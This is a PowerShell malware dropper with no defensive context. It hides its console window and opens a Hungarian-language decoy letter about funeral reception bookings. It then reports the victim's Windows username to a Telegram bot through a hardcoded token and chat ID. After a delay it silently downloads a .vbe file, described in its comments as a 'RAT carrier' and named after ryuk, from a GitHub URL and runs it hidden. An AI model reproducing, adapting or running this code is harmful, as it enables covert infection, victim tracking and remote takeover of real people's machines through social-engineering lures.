# HIDE THE POWERSHELL WINDOW
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# CREATE AND RUN LEGIT TXT
$fileName = "01 - Frissített emlékfogadási csomagok.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
Kedves Kolléga!

Reméljük, jól van.

A temetőben a temetési szertartások zökkenőmentes lebonyolításának támogatása érdekében szeretnénk tájékoztatni Önöket a temetési fogadási műveletekkel kapcsolatos számos frissítésről.

A kommunikáció és a foglalási hatékonyság javítása érdekében frissítettük a temetési szertartásokat követő fogadási szolgáltatások elsődleges foglalási eljárásait és elérhetőségeit.

2026. augusztus 1-jétől minden fogadási foglalással, időpontfoglalással és koordinációs kéréssel kapcsolatban a frissített elérhetőségi csatornáinkon keresztül kell foglalkozni.

Kérjük, hogy munkatársaink továbbra is irányítsák csapatunkhoz a temetés utáni fogadási lehetőségekkel kapcsolatban érdeklődő családokat, és hogy a jövőbeni koordináció esetén a mellékelt elérhetőségeket használják.

A fogadási lehetőségeink továbbra is elérhetőek a temetőben tartott szertartásokhoz, és továbbra is szorosan együttműködünk a temetkezési vállalkozókkal, a papokkal és a temető személyzetével annak biztosítása érdekében, hogy a fogadási időbeosztás összhangban legyen a temetési szertartásokkal.

Amennyiben a szertartások időpontjának változása miatt bármilyen ütemezési módosítás merül fel, kérjük, mielőbb tájékoztassák Önöket, hogy ennek megfelelően tudjuk fogadni a családokat.

Köszönjük folyamatos együttműködésüket és támogatásukat. Nagyra értékeljük a kiépített szakmai kapcsolatot, és örömmel folytatjuk szoros együttműködésünket.

Üdvözlettel,

Dolorosa Kft.
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# SEND A MESSAGE TO TELEGRAM
$Token = "8619279911:AAHhKbQ6AqO5g3d8mTtEiCbaskTS8BTut5U"
$ChatID = "5811994741"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# DELAY
Start-Sleep -Seconds 120

# Hidden download and launch the RAT carrier
$Url = "https://github.com/yourselina/cheva/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit